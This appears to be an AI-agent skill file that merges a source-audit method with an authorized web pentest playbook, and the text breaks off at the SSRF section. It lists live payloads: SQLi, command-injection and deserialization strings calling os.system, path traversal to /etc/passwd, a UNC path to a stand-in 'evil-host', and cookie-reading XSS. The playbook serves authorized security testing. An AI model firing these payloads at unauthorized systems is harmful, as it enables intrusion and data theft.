# SECURITY.md — Comprehensive Security Audit & Authorized Penetration Testing Playbook

## 0. Purpose

This is a **single-file, agent-agnostic security skillset** for code-capable AI agents (Antigravity and similar systems).

It consolidates the supplied security methodology, guardrails, reconnaissance workflow, vulnerability taxonomy, exploitation techniques, bypass techniques, authorization model, queue schema, recon script, and reporting template into one operational document.

The material below is preserved as supplied. The rules in this section provide the agent-oriented operating layer for using the consolidated material safely and consistently outside Hermes.

---

## 1. Agent Operating Contract

### 1.1 Two operating modes

The agent MUST distinguish between these modes:

**SOURCE / OFFLINE AUDIT MODE**

Use this when the task is repository/code/document analysis and no active network interaction is required.

In this mode the agent may:

- Read the complete codebase and configuration.
- Trace data flow from request sources to security-sensitive sinks.
- Review authentication, authorization, session handling, cookies, headers, CSP, SSRF controls, file handling, serialization, template rendering, document generation, dependency usage, secret handling, and business logic.
- Identify candidate vulnerabilities and provide exact file/line references.
- Produce defensive patches, tests, and remediation guidance.
- Build an attack-surface map from source without sending traffic.

Do NOT treat a source-only indication as a confirmed exploitable vulnerability unless the available evidence establishes exploitability.

**ACTIVE / AUTHORIZED TESTING MODE**

Use this only when the operator has explicitly authorized active testing of the specified target and the target is within a declared scope.

Before any payload-bearing or otherwise active request, apply the authorization and scope rules preserved below. When authorization, scope, or target ownership is uncertain, stop rather than infer permission.

### 1.2 Default behavior

When a user asks for a security audit of a local repository, the default is **SOURCE / OFFLINE AUDIT MODE**.

Do not silently turn a code review into a live penetration test merely because the repository contains URLs, deployed hosts, or test scripts.

### 1.3 Evidence standard

Classify findings according to the evidence actually available:

- **Observed / confirmed:** demonstrated by source evidence, a reproducible test, or both.
- **Likely / probable:** strong evidence exists but exploitability or runtime behavior is not fully demonstrated.
- **Candidate:** a suspicious pattern requiring validation.
- **False positive:** only after the applicable defense analysis and, where authorized, the relevant bypass set have been exhausted.

Do not inflate severity merely because a dangerous sink exists. Identify the source, trust boundary, slot/render context, actual defense, exploit preconditions, and impact.

### 1.4 Security review order

For a source audit, work systematically in this order unless the task specifies otherwise:

1. Architecture and trust boundaries
2. Authentication and session management
3. Authorization and tenant isolation
4. Input validation and normalization
5. Injection and dangerous sinks
6. File/document/spreadsheet generation
7. SSRF and URL handling
8. XSS and output/rendering contexts
9. Secrets and client/server boundary leakage
10. CSRF and cross-origin behavior
11. Security headers, TLS, cookies, and subdomain boundaries
12. DoS, resource exhaustion, concurrency, and race conditions
13. Dependency and supply-chain exposure
14. Logging, monitoring, and error disclosure
15. Business-logic abuse cases
16. Verification, remediation, regression tests, and reporting

### 1.5 Source-audit hardening rules

For every candidate finding, the agent should attempt to establish:

- Exact file path and line or symbol location.
- Attacker-controlled input source.
- Security-sensitive sink.
- Trust-boundary transition.
- Effective defense present in the actual execution path.
- Whether the defense matches the relevant injection/rendering/authorization slot.
- Authentication state required to exploit it.
- Tenant or ownership constraints.
- Whether exploitation requires unusual deployment assumptions.
- Whether the behavior is reachable in production configuration.
- Impact and realistic attack preconditions.
- Minimal safe proof or verification method.
- A concrete remediation and regression test.

### 1.6 Defensive patch requirements

When proposing code changes:

- Prefer the smallest idiomatic fix that closes the vulnerability at the correct trust boundary.
- Preserve existing functionality where practical.
- Add defense in depth rather than relying on a single filter.
- Avoid security through obscurity.
- Prefer allowlists and structured APIs over blacklists.
- Prefer parameterization over escaping for structured interpreters.
- Prefer context-appropriate output encoding.
- Keep authorization checks server-side and close to the protected resource.
- Do not expose secrets merely to make a client-side feature convenient.
- Include regression tests for the vulnerable condition.

### 1.7 Safe testing hierarchy

Use the least invasive evidence that can establish the claim:

1. Static/source evidence
2. Unit/integration test against a local fixture
3. Local or isolated test instance
4. Read-only reconnaissance of an explicitly authorized target
5. Minimal proof payload
6. More advanced exploitation only when explicitly authorized and necessary to establish impact

Do not use destructive payloads where a non-destructive witness is sufficient.

### 1.8 Sensitive evidence handling

Never place real secrets, session tokens, passwords, private keys, or unnecessary personal data into chat output.

Redact sensitive values in findings and examples. Store complete sensitive evidence only in an appropriately protected local artifact when explicitly necessary for an authorized assessment.

### 1.9 Single-file reference mapping

The original material below refers to files such as:

- `engagement/authorization.md`
- `engagement/scope.txt`
- `references/scope-enforcement.md`
- `references/vuln-taxonomy.md`
- `references/exploitation-techniques.md`
- `references/bypass-techniques.md`
- `templates/authorization.md`
- `templates/pentest-report.md`
- `templates/exploitation-queue.json`
- `scripts/recon-scan.sh`

In this consolidated file, those references should be interpreted as the **corresponding preserved sections in this document**. If an external assessment repository actually contains those files, the external files take precedence for execution-specific state such as the current authorization and scope.

The included `recon-scan.sh` is reference material and is not automatically safe to execute merely because it appears in this document.

---

## 2. Comprehensive Source-Audit Expansion

The supplied methodology is penetration-test oriented. When this document is used purely as a code-review/security-review skill, also cover the following source-level concerns before concluding the audit:

### Application and framework boundaries

- Route handlers, middleware, server actions, server components, client components, edge/runtime differences, and server-only modules.
- Public assets, generated assets, build-time versus runtime configuration, and deployment-specific behavior.
- Reverse-proxy assumptions, trusted proxy headers, forwarded host/proto handling, and canonical-origin logic.
- Cross-subdomain cookie scope and shared authentication state.

### Authentication and authorization

- Every state-changing route and server-side action.
- Object-level authorization at the final data access point, not only at the UI/router layer.
- Horizontal and vertical privilege escalation.
- Tenant isolation and identifier swapping.
- Password-reset, invitation, email-verification, recovery, logout, and session-rotation flows.
- JWT validation including algorithm, issuer, audience, expiration, key selection, and token source.
- Race conditions in authentication, role changes, token issuance, and account recovery.

### Input and dangerous-sink analysis

Trace attacker-controlled values into:

- SQL and database query construction.
- Shell/process execution.
- File paths and file-system operations.
- Template engines.
- HTML, URL, JavaScript, CSS, and DOM sinks.
- Redirects and fetch targets.
- XML, XPath, LDAP, regular expressions, serialization/deserialization.
- Logging and HTTP header construction.
- Document, PDF, spreadsheet, archive, and image-processing pipelines.

### Next.js / TypeScript specific checks

- `middleware.ts` matcher coverage and bypassable path variants.
- Server/client boundary leakage.
- `NEXT_PUBLIC_*` exposure.
- Server action authorization.
- Route handler authentication consistency.
- Caching and revalidation authorization.
- `fetch` caching behavior where sensitive responses could be shared.
- ISR/revalidation endpoints and webhook verification.
- Image optimization remote-pattern restrictions.
- Dynamic route handling and path normalization.
- `redirect`, `rewrite`, and forwarded-header trust.
- Environment variable access patterns.
- Error boundaries and production error disclosure.

### Security headers and browser boundaries

Inspect cookies, CSP, HSTS, frame protections, referrer policy, permissions policy, MIME sniffing protection, and cross-origin behavior. Pay particular attention to whether a control is enforced centrally and whether there are route-specific exceptions.

### Availability and resilience

Review unbounded loops, regexes, recursion, decompression, parsing, buffering, file uploads, image/document processing, concurrent requests, promise aggregation, retry amplification, cache growth, connection exhaustion, and expensive cryptographic or CPU-heavy operations.

### Supply chain

Inspect package versions, transitive dependencies where practical, postinstall behavior, dynamic imports, remote scripts, third-party SDKs, CI/CD workflows, generated artifacts, and dependency trust boundaries.

---

## 3. Final Audit Output Contract

Unless the user requests a different format, the final source-security audit should contain:

### Executive Vulnerability Matrix

| ID | Severity | Confidence | Class | Location | Exploitability | Impact | Status |
|---|---|---|---|---|---|---|---|
| SEC-001 | Critical/High/Medium/Low/Info | Confirmed/Likely/Candidate | ... | `path:line` | ... | ... | ... |

### Finding format

For each finding provide:

1. Title
2. Severity
3. Confidence / evidence status
4. CWE / OWASP mapping where appropriate
5. Exact file and line or symbol
6. Source → sink / attack path
7. Why the existing defense is insufficient
8. Preconditions
9. Minimal proof or verification method
10. Impact
11. Recommended fix
12. Drop-in code diff where practical
13. Regression test
14. Residual risk / limitations

Do not report a candidate as a confirmed vulnerability merely because a dangerous API or pattern exists.

### Clean-audit wording

A clean source review means:

> No exploitable issue was established in the reviewed code and configuration within the stated review scope, time, and methods.

It does not mean:

> The application is secure.

---

## 4. Preserved Original Security Material

The following material is retained from the supplied files without substantive rewriting so the original playbooks, taxonomy, guardrails, evidence model, and report structure remain available.

---



<!-- ===== SOURCE: SKILL.md ===== -->

---
name: web-pentest
description: "Authorized web pentest: recon, proof-based exploits, report."
version: 1.0.0
author: Teknium (teknium1), Hermes Agent
license: MIT
platforms: [linux, macos]
category: security
triggers:
  - "pentest [URL]"
  - "pentest this app"
  - "penetration test [URL]"
  - "security test this web app"
  - "test [URL] for vulnerabilities"
  - "find vulns in [URL]"
  - "OWASP test [URL]"
toolsets:
  - terminal
  - web
  - browser
  - file
  - delegation
metadata:
  hermes:
    tags: [Security, Pentest, Web, Recon]
    related_skills: []
---

# Web Application Penetration Testing

A phased pentesting workflow for running web applications. Adapted from
Shannon's pipeline (Keygraph, AGPL — concepts only, no code borrowed).
Built around three rules:

1. No exploit, no report — every finding requires reproducible evidence.
2. Bounded scope — every active request goes against a target the operator
   pre-declared. Off-scope hosts are refused.
3. Bypass exhaustion before false-positive dismissal — a "blocked" payload
   is not a clean bill of health until you've tried the bypass set.

---

## ⚠️ Hard Guardrails — Read Before Every Engagement

Violating any of these invalidates the engagement and may be illegal.

1. **Authorization gate.** Before the first active scan in a session, you
   MUST confirm with the user, in writing, that they own or have written
   authorization to test the target. Record the acknowledgement in
   `engagement/authorization.md` (see template). No acknowledgement → no
   active scanning. Reading public pages with `curl` is fine; sending
   payloads is not.

2. **Scope allowlist.** Maintain `engagement/scope.txt` — one hostname or
   CIDR per line. Every `nmap`, `curl`, `whatweb`, browser navigation, or
   payload-bearing request MUST be against an entry in scope. If a target
   redirects you off-scope (3xx to a different host, a link in HTML),
   STOP and confirm with the user before following.

3. **No production systems without paper.** If the user hasn't told you
   "yes, prod is in scope and I have written sign-off," assume not. Default
   targets are staging, local docker, dedicated test instances.

4. **Cloud metadata is off by default.** Do not probe `169.254.169.254`,
   `metadata.google.internal`, `100.100.100.200`, `[fd00:ec2::254]`, or
   equivalent unless the engagement explicitly includes SSRF-to-metadata
   as a goal AND the target is one you control. The agent's browser tool
   can reach these from inside your own infrastructure — don't.

5. **Destructive payloads need approval.** SQLi payloads that DROP/DELETE,
   filesystem-write SSTI, command injection with `rm`/`shutdown`/`mkfs`,
   anything that mutates beyond a single test row → ASK FIRST. The
   `approval.py` system catches some; don't rely on it alone.

6. **Aux-client leakage risk (Hermes-specific).** This skill produces
   sessions full of SQLi/XSS/RCE payloads, captured credentials, JWT
   tokens. Hermes' compression and title-generation paths replay history
   through the auxiliary client (often the main model). Anything sensitive
   you write to the conversation can leave the box on the next compress.
   Mitigation:
   - Redact captured tokens/credentials to the LAST 6 CHARS before logging
     them in any message. Full values go to `engagement/evidence/` files,
     never into chat history.
   - If the engagement is sensitive, set `auxiliary.title_generation.enabled: false`
     in `~/.hermes/config.yaml` for the session.

7. **Rate limit yourself.** Default 200ms between active requests against
   any single host. The recon-scan.sh script enforces this. Don't bypass
   it without operator approval.

8. **Authority of the report.** This skill produces a security
   assessment, not a "PASS." Even a clean run is "no exploitable issues
   FOUND in scope X within time T using methods Y" — not "the application
   is secure." Mirror that language in the report.

---

## Phase 0: Engagement Setup

Before any scanning happens, create the engagement directory and
authorization acknowledgement.

```bash
ENGAGEMENT=engagement-$(date +%Y%m%d-%H%M%S)
mkdir -p "$ENGAGEMENT"/{evidence,findings,reports}
cd "$ENGAGEMENT"
```

1. **Ask the user (verbatim):**
   > "Confirm: (a) the target URL is [X], (b) you own this application
   > or have written authorization to test it, and (c) the engagement
   > may run for up to [N] hours starting now. Reply 'authorized' to
   > proceed."

2. **Wait for explicit `authorized` response.** Any other answer means STOP.

3. **Record authorization** to `engagement/authorization.md` using the
   template in `templates/authorization.md`. Include:
   - Target URL(s) and IP(s)
   - Authorization basis (ownership / written authz from $name)
   - Engagement window
   - Out-of-scope items (production, third-party services, etc.)
   - Operator name (the user driving this session)

4. **Build scope.txt:**
   ```
   localhost
   127.0.0.1
   staging.example.com
   192.168.1.0/24    # internal lab only, with operator OK
   ```

5. **Read** `references/scope-enforcement.md` before issuing the first
   active request — that doc has the host-extraction rules you apply
   to every command/URL before it goes out.

---

## Phase 1: Pre-Recon (Code Analysis, optional)

Skip if no source access (black-box engagement).

If you have read access to the application source:

1. **Map the architecture** — framework, routing, middleware stack
2. **Inventory sinks** — every `execute(`, `os.system(`, `eval(`,
   template render, file read/write, redirect target
3. **Map auth** — session cookie vs JWT, OAuth flows, password reset,
   privileged endpoints
4. **Identify trust boundaries** — what's authenticated, what's not,
   what comes from `request.*`
5. **Backward taint** from each sink to a request source. Early-terminate
   when proper sanitization is found (parameterized queries, allowlists,
   `shlex.quote`, well-known escapers).

Output: `evidence/pre-recon.md` — architecture map, sink inventory,
suspected vulnerable code paths.

This is OFFLINE work. No traffic to the target.

---

## Phase 2: Recon (Live, Read-Only)

Maps the attack surface. All requests are GETs of public pages, no
payloads yet. Still scope-bounded.

1. **Verify scope.** Resolve every target hostname → IP. Confirm IPs are
   in scope (avoids the "DNS points somewhere unexpected" trap).

2. **Network surface** (only if scope permits port scanning):
   ```bash
   nmap -sT -T3 --top-ports 100 -oN evidence/nmap.txt $TARGET
   ```
   Use `-T3` (default), not `-T4/-T5`. Stealthier and avoids tripping
   IDS/IPS in shared environments.

3. **Tech fingerprint:**
   ```bash
   whatweb -v $TARGET_URL > evidence/whatweb.txt
   curl -sIk $TARGET_URL > evidence/headers.txt
   ```

4. **Endpoint discovery:**
   - Crawl the app with the browser tool (`browser_navigate`,
     `browser_get_images`, follow links).
   - Inspect `robots.txt`, `sitemap.xml`, `.well-known/*`.
   - Use the developer tools network panel via browser tool to capture
     XHR/fetch calls.

5. **Auth surface:** Identify login, registration, password reset,
   session cookie names, token formats. Do NOT send credentials yet —
   just observe.

6. **Correlate with pre-recon** (if you have source). For each
   `evidence/pre-recon.md` finding, mark whether the live surface
   confirms it's reachable.

Output: `evidence/recon.md` — endpoints, technologies, auth model,
input vectors.

---

## Phase 3: Vulnerability Analysis

One delegate_task per vulnerability class. Each agent reads
`evidence/recon.md` (+ `evidence/pre-recon.md` if present), produces
`findings/<class>-queue.json` using `templates/exploitation-queue.json`.

Use `delegate_task` with these focused subagents (parallel where possible):

| Class | Goal | Reference |
|-------|------|-----------|
| `injection` | SQLi, command, path traversal, SSTI, LFI/RFI, deserialization | `references/vuln-taxonomy.md` (slot types) |
| `xss` | Reflected, stored, DOM-based | `references/vuln-taxonomy.md` (render contexts) |
| `auth` | Login bypass, JWT confusion, session fixation, OAuth flaws | `references/exploitation-techniques.md` |
| `authz` | IDOR, vertical/horizontal escalation, business logic | `references/exploitation-techniques.md` |
| `ssrf` | Internal reachability, metadata, protocol smuggling | Skip metadata unless explicitly authorized |
| `infra` | Misconfig, info disclosure, default creds, exposed admin | `references/exploitation-techniques.md` |

Each queue entry has: id, vuln class, source (file:line if known),
endpoint, parameter, slot type, suspected defense, verdict
(`identified` / `partial` / `confirmed` / `critical`), witness payload,
confidence (0-1), notes.

The analysis phase doesn't send malicious payloads yet — it stages them.
The exploitation phase actually fires them.

---

## Phase 4: Exploitation (Proof-Based, Conditional)

Only run a sub-agent per class where the analysis queue has actionable
entries (`identified` or `partial`).

For each candidate:

1. **Pre-send check** — host in scope? auth gate satisfied? payload
   approved if destructive?
2. **Send the witness payload** — minimal proof. SQLi: `' AND 1=1--`
   then `' AND 1=2--`. XSS: a benign marker like
   `<svg/onload=console.log("HERMES-PENTEST-XSS")>`. Never `alert(1)` in
   stored XSS — it'll fire for other users in shared environments.
3. **Verify the witness fires** — for blind injection, use a sleep
   probe (`SLEEP(5)`) and time the response. For SSRF, use a
   tester-controlled callback host you own (NOT a public service like
   webhook.site for sensitive engagements — exfil paths).
4. **Promote level:**
   - **L1 Identified** — pattern matched, no behavior change
   - **L2 Partial** — sink reached, but defense in place
   - **L3 Confirmed** — payload changed app behavior in observable way
   - **L4 Critical** — data extracted, code executed, access escalated
5. **Bypass exhaustion before classifying as FP.** For each candidate
   that blocks: try at least the bypass set in
   `references/bypass-techniques.md` for that class. Only after the set
   is exhausted may you write `verdict: false_positive`.
6. **Record evidence** for every L3/L4:
   - Full request (method, URL, headers, body)
   - Response (status, headers, relevant body excerpt)
   - Reproducer command (curl one-liner)
   - Impact statement

Output: `findings/exploitation-evidence.md`

**Redact in evidence files:**
- Any captured credentials/tokens → last 6 chars only in chat;
  full value to `findings/secrets-vault.md` (gitignored).
- Other users' PII → redact.
- Your test credentials → fine to keep.

---

## Phase 5: Reporting

Generate the final report using `templates/pentest-report.md`. Sections:

1. Executive summary
2. Engagement scope (from `engagement/scope.txt`)
3. Authorization (from `engagement/authorization.md`)
4. Findings (L3/L4 only — proof-required). Per finding:
   - Title, severity (CVSS 3.1), CWE
   - Affected endpoint(s)
   - Proof (request + response excerpt)
   - Reproduction steps
   - Impact
   - Remediation
5. Not-exploited candidates (L1/L2 with notes on what blocked them)
6. Out-of-scope observations
7. Methodology / tools used
8. Limitations and what was NOT tested

**Severity policy:** CVSS only for L3/L4. L1/L2 are "candidates pending
verification" — don't assign CVSS to unverified findings.

---

## When to Stop

- The user revokes authorization.
- A candidate finding clearly impacts production data and you don't have
  approval for destructive testing — STOP and ask.
- The target starts returning 503/429 storms — back off, reconvene with
  the operator.
- You discover something *outside* the contracted scope (e.g. an exposed
  customer database while testing an unrelated endpoint). STOP, document,
  report to the operator. Do not pivot without explicit approval — that
  pivot is what makes pentesting illegal.

---

## What This Skill Does NOT Cover

- Network-layer pentesting beyond port scanning (no Metasploit,
  Cobalt Strike, AD attacks, network protocol fuzzing).
- Reverse engineering / binary analysis (see issue #383).
- Source-only static analysis (see issue #382).
- Active social engineering / phishing.
- Anything against systems the operator hasn't pre-authorized.

If the engagement needs any of these, escalate to a professional
pentester. This skill complements professional pentesting; it does
not replace it.

---

## Further Reading

- `references/scope-enforcement.md` — how to bound every active request
- `references/vuln-taxonomy.md` — slot types, render contexts, OWASP map
- `references/exploitation-techniques.md` — per-class payload patterns
- `references/bypass-techniques.md` — common WAF/filter bypasses
- `templates/authorization.md` — engagement authorization template
- `templates/pentest-report.md` — final report template
- `templates/exploitation-queue.json` — per-class finding queue schema
- `scripts/recon-scan.sh` — rate-limited nmap+whatweb+headers wrapper



<!-- ===== SOURCE: scope-enforcement.md ===== -->

# Scope Enforcement

The pentest skill is dangerous because Hermes can drive network tools
unattended. The single most important rule: **every active request must
target a host the operator authorized.** This file is the procedure.

## The Three Authorities

1. `engagement/authorization.md` — what the operator wrote down.
2. `engagement/scope.txt` — the machine-readable allowlist.
3. The current shell prompt — implicit: "I'm running as Hermes inside
   the operator's box."

If any of those three disagree, you STOP and ask. Don't try to reconcile.

## scope.txt format

One target per line. Comments with `#`.

```
# Hostnames — resolved at use time
localhost
127.0.0.1
::1
staging.example.com
api-staging.example.com

# CIDR — internal labs only, requires operator OK in writing
192.168.50.0/24
10.0.5.0/24
```

Wildcards are NOT supported. If you need `*.staging.example.com`, list
each host explicitly. This is on purpose: subdomain wildcards in
authorization scope are how unauthorized testing happens.

## Host Extraction Rules

Before any active request, extract the target host from the command
or URL and confirm it's in scope.

| Surface | Where the host lives | Example |
|---------|----------------------|---------|
| `curl URL` | The URL | `curl https://staging.example.com/login` |
| `curl --resolve HOST:PORT:ADDR` | HOST | reject — resolve overrides scope |
| `nmap TARGET` | Each TARGET arg | `nmap 10.0.5.5 staging.example.com` |
| `whatweb URL` | The URL | `whatweb https://staging.example.com` |
| `browser_navigate(url)` | The URL | python-side: extract host from `url` |
| Tool-driven HTTP (sqlmap, wfuzz, gobuster) | `-u`, `-h`, target arg | depends on tool |

For URLs: `urllib.parse.urlparse(url).hostname.lower()`.
For raw IPs: keep as IP, check against CIDR entries with
`ipaddress.ip_address(host) in ipaddress.ip_network(cidr)`.

## Pre-Send Checklist

For every active request, before you press enter:

1. Did you extract the host correctly? (URL host, not Host header, not
   `--resolve` aliasing.)
2. Is the host in scope.txt (exact hostname match) OR is its resolved
   IP in a scope.txt CIDR?
3. If it's a redirect target you're following, did you re-check scope
   on the redirect URL?
4. If it's the second hop of an SSRF probe, is the inner URL in scope?
   (Usually NOT — that's the whole point. Don't auto-fire.)
5. Did the operator approve this class of payload? (Read-only recon
   is auto-OK; destructive payloads need explicit OK.)

If any answer is "no" or "not sure," STOP and ask the operator.

## Things That Look In-Scope But Aren't

- **Redirects to a parent or sister host.** `staging.example.com` →
  `auth.example.com` is a different host. Stop, re-confirm.
- **CNAMEs.** `app.staging.example.com` may CNAME to
  `prod-cluster.aws.example.com`. Resolve and check IP, not just name.
- **Cloud metadata IPs.** `169.254.169.254` is not in any sane
  scope.txt. If your SSRF candidate resolves there, you're probably
  testing against a real cloud host and need explicit approval before
  the probe.
- **127.0.0.1 / localhost on a shared box.** If you're in a container
  or shared dev box, `localhost` may be someone else's service.
  Confirm with the operator that 127.0.0.1 means what they think.
- **External services the target depends on.** Stripe API, OAuth
  providers, S3 buckets — even if your tests would touch them, they
  are NOT in scope by default.

## When Scope Fails Open

If you can't decide whether a host is in scope:

```
DEFAULT: out of scope.
```

Stop the agent. Ask the operator. Resume only after written
confirmation. There is no penalty for asking; there is significant
penalty for testing the wrong host.

## Logging

Every active request should append to `engagement/request-log.jsonl`:

```json
{"ts": "2026-05-25T03:14:15Z", "method": "GET", "url": "https://staging.example.com/api/users", "host": "staging.example.com", "in_scope": true, "phase": "recon", "result_status": 200, "evidence_ref": "evidence/recon.md#endpoints"}
```

This is your audit trail. If anyone ever asks "why did the pentest
agent hit X?" you can answer from this log.



<!-- ===== SOURCE: vuln-taxonomy.md ===== -->

# Vulnerability Taxonomy

Two classification systems used during analysis. Both come from Shannon
(concepts only; rewritten here). Both exist to make the question
"is this exploitable?" mechanical instead of vibes-based.

## Injection: Slot Types

Every injection sink has a **slot type** — the lexical position the
attacker payload lands in. Each slot type has a small set of
**required defenses**. A mismatch is a vulnerability. The same defense
applied to the wrong slot is also a vulnerability.

| Slot | Example | Required defense |
|------|---------|------------------|
| `SQL-val` | `SELECT * FROM u WHERE id = :v` | Parameterized binding |
| `SQL-ident` | `SELECT * FROM ${table}` | Allowlist on identifier values |
| `SQL-keyword` | `ORDER BY ${col} ${dir}` | Allowlist on column AND direction |
| `CMD-argument` | `subprocess.run(["ls", v])` | argv list (never shell=True) |
| `CMD-shell` | `os.system("ls " + v)` | DON'T — refactor to argv list |
| `PATH-segment` | `open("/data/" + v)` | Normalize + allowlist + base-relative check |
| `URL-host` | redirect to `https://${v}/x` | Allowlist of acceptable hosts |
| `URL-fetch` | `requests.get(v)` | Allowlist + block private/metadata IPs (SSRF) |
| `TEMPLATE-string` | `Template("Hello {{ v }}")` | Autoescape ON, no user-controlled template syntax |
| `DESERIALIZE-pickle` | `pickle.loads(v)` | DON'T — use JSON / msgpack |
| `DESERIALIZE-yaml` | `yaml.load(v)` | `yaml.safe_load`, never `yaml.load` |
| `XPATH-expr` | `tree.xpath("//u[@id='" + v + "']")` | Parameterized XPath or escape |
| `LDAP-filter` | `(uid=${v})` | LDAP filter escaping |
| `REGEX-pattern` | `re.search(v, text)` | Don't take pattern from user (ReDoS too) |
| `LOG-record` | `log.info("got " + v)` | Encode CR/LF/control chars before logging |
| `EMAIL-header` | `Subject: ${v}` | Reject CR/LF |
| `HTTP-header` | `Set-Cookie: ${v}` | Reject CR/LF (response splitting) |

When you classify a finding:
1. Identify the slot type
2. Identify the actual defense in the code (if you have source)
3. If defense doesn't match the required-defense set: vulnerable

## XSS: Render Contexts

XSS exploitability depends on **where** in the HTML/JS the value lands.
Encoding for one context doesn't protect another.

| Context | Example | Required encoding |
|---------|---------|-------------------|
| `HTML_BODY` | `<div>{{ v }}</div>` | HTML entity encode `<>&"'` |
| `HTML_ATTR_QUOTED` | `<a href="{{ v }}">` | HTML attr encode |
| `HTML_ATTR_UNQUOTED` | `<a href={{ v }}>` | Almost impossible to safely encode; quote the attr |
| `URL_ATTR` (href/src) | `<a href="{{ v }}">` | Validate scheme allowlist + attr encode |
| `JAVASCRIPT_STRING` | `<script>var x = "{{ v }}";</script>` | JS string escape + ensure quote consistency |
| `JAVASCRIPT_BLOCK` | `<script>{{ v }}</script>` | DON'T — refactor; no safe encoding |
| `CSS_VALUE` | `<style>color: {{ v }};</style>` | CSS encode + allowlist scheme/format |
| `CSS_BLOCK` | `<style>{{ v }}</style>` | DON'T — refactor |
| `JSON_RESPONSE` (consumed by JS) | `JSON.parse(response)` | JSON encode + correct content-type header |
| `EVENT_HANDLER` | `<div onclick="{{ v }}">` | JS string escape *inside* HTML attr encode |
| `URL_PATH` (router-driven) | route param echoed unencoded | URL-encode + HTML-encode |
| `DOM_INNERHTML` | `el.innerHTML = v` (DOM XSS) | Use `textContent` instead, or DOMPurify |
| `DOM_DOC_WRITE` | `document.write(v)` | DON'T — refactor |

When you classify:
1. Identify the render context where user input lands
2. Identify the encoding applied
3. Mismatch = vulnerable. Even "HTML encoded" output in
   `JAVASCRIPT_STRING` is exploitable (`</script><script>` evasion).

## OWASP Top 10 (2021) Mapping

For reporting:

| OWASP | Slot/context covered |
|-------|----------------------|
| A01 Broken Access Control | authz class (IDOR, vertical/horizontal) |
| A02 Cryptographic Failures | infra class (weak TLS, plaintext storage) |
| A03 Injection | injection class (all slot types except deserialize) |
| A04 Insecure Design | reported in findings narrative |
| A05 Security Misconfiguration | infra class |
| A06 Vulnerable Components | infra class (whatweb output) |
| A07 Auth Failures | auth class |
| A08 Software/Data Integrity | DESERIALIZE-* slots, also supply chain |
| A09 Logging/Monitoring | infra class (out of scope for active testing) |
| A10 SSRF | ssrf class |



<!-- ===== SOURCE: exploitation-techniques.md ===== -->

# Exploitation Techniques

Per-class playbooks. Use these as starting points for witness payloads.
ALWAYS apply scope enforcement before sending anything from this file.

## Injection

### SQL Injection

Witness sequence (UNION-blind safe):
1. Baseline: capture response for original parameter
2. `' AND 1=1--` (true branch)
3. `' AND 1=2--` (false branch)
4. Compare lengths/bodies. Difference = SQLi.

Time-based:
- MySQL: `' AND SLEEP(5)--`
- Postgres: `'; SELECT pg_sleep(5)--`
- MSSQL: `'; WAITFOR DELAY '0:0:5'--`
- SQLite: `' AND randomblob(100000000)--` (CPU-burn alternative)

DO NOT send: `'; DROP TABLE` payloads. Reproducing the bug doesn't
require destruction.

### Command Injection

Witness:
- Linux: `; sleep 5` or `$(sleep 5)` or `` `sleep 5` ``
- Windows: `& timeout /t 5`
- If output is reflected: `; echo HERMESPENTEST-$(id)`

Blind: time-delay probe is universally safe. Don't `rm -rf`.

### Path Traversal

Witness: `../../../../etc/passwd` (Linux) or `..\..\..\..\windows\win.ini` (Windows).
Try with: URL-encoded, double-encoded, Unicode (`%c0%ae%c0%ae`),
and SMB UNC (`\\evil-host\share` — only with operator OK).

### SSTI (Server-Side Template Injection)

Witness:
- Jinja2: `{{7*7}}` → `49`
- Twig: `{{7*7}}` → `49`
- Smarty: `{$smarty.version}` or `{php}echo 1;{/php}`
- ERB: `<%= 7*7 %>` → `49`
- Velocity: `#set($x=7*7)$x`

Detection is the 49 (or template-specific equivalent). Don't go to RCE
without operator OK.

### Deserialization

If you can identify the format:
- Pickle: send `cos\nsystem\n(S'sleep 5'\ntR.` (base64'd, in the
  right context). Witness via time delay.
- YAML: `!!python/object/apply:os.system ["sleep 5"]`
- Java serialized: ysoserial gadgets, only with operator OK because
  these almost always RCE.

## XSS

### Reflected

Witness: `<svg/onload=fetch("/HERMES-PENTEST-XSS-"+document.cookie)>`
where the path is one you'll grep for in server logs. NEVER use
`alert(1)` — pop-ups annoy real users if your "test" target has any.

If reflected unencoded → L3 confirmed.

### Stored

Witness in a way that ONLY YOUR test account sees first. Use a unique
marker per finding. If the marker fires for other users → L4 critical.

Pattern: `<svg/onload=fetch("/HERMES-${runId}-${vulnId}")>`. Add a
server-side log grep step to your evidence.

### DOM XSS

Inspect every `document.write`, `innerHTML`, `eval`, `setTimeout(string)`,
`Function(string)`, `setAttribute("href", ...)` site. The taint source
is usually `location.hash`, `location.search`, `localStorage`,
`postMessage` data, URL fragments.

Witness: navigate to `#<img src=x onerror=...>`. Confirm the
sink fires.

## Auth

### Login Bypass

- SQLi in login: `' OR '1'='1` (very old, but check)
- Boolean defaults: `username: admin, password: admin/password/123456`
  (only on lab targets, not production)
- Account enumeration: timing or response difference between
  "unknown user" vs "wrong password"
- Rate limiting: send 50 wrong passwords in 30s; see if you're throttled

### JWT Attacks

1. **alg:none**: change header to `{"alg":"none","typ":"JWT"}`, strip
   signature. If accepted → critical.
2. **alg confusion**: HS256 signed with the RS256 public key. If the
   server stores the RS256 cert as a "secret" and the algorithm is
   attacker-controlled, this works.
3. **Weak HMAC secret**: try `jwt_tool` or `hashcat` against the JWT
   with rockyou.txt (only if you have operator OK to crack).
4. **kid header injection**: `kid` set to a SQLi payload or path-traversal
   to load a known key.
5. **Expired token still accepted**: replay an old token.

### Session

- Cookie attrs: `Secure`, `HttpOnly`, `SameSite=Strict|Lax`.
- Session fixation: log in, note cookie, log out, log in again — same
  cookie? Vulnerable.
- Logout: does logout invalidate server-side, or just clear the client?

### Password Reset

- Predictable token (timestamp, sequential, weak random)
- Host header poisoning in reset link (`Host: evil.test`)
- No rate limit on reset endpoint
- Token reuse / no expiry
- Email enumeration via reset response

## Authz (Access Control)

### IDOR

Pattern: change `?id=123` to `?id=124`. If you see another user's data,
L3 confirmed.

Variants:
- Sequential IDs (easy)
- UUIDs (still try — they leak in logs/responses)
- Mass assignment: send extra params like `is_admin: true`, `role: admin`
- HTTP method override: `GET /users/123` works, but `PUT /users/123` is
  not authz-checked

### Privilege Escalation

Vertical: regular user → admin endpoint. Check:
- `/admin/*` accessible to non-admin?
- `role` field in JWT/session client-editable?
- Tenant ID swap: `tenant_id=mine` → `tenant_id=theirs`

Horizontal: user A → user B same role. Reuse IDOR patterns.

### Business Logic

- Negative quantity in cart
- Race conditions (double-spend, atomicity)
- Workflow skip (POST to step 3 without doing step 2)
- Coupon stacking
- Discount > total

## SSRF

Witnesses for SSRF probing (only to hosts the operator approved):

